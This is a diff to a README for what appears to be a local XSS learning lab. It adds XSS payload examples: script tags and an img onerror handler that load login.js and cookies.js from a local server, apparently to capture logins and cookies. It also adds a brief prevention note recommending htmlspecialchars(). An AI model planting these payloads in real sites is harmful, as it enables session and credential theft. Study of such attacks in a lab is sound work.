@@ -19,7 +19,10 @@ php -S 127.0.0.1:6969
 - [x] preventions
 
 ## XSS examples
+- `simple input script`
 - `<script src="http://127.0.0.1:6969/login.js"></script>`
 - `<script src="http://127.0.0.1:6969/cookies.js"></script>`
-- `<img onerror="document.body.insertBefore"></script>`
-- `<script></script>`
+- [notTested] `<img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>`
+
+## Prevention
+simply use `htmlspecialchars()`
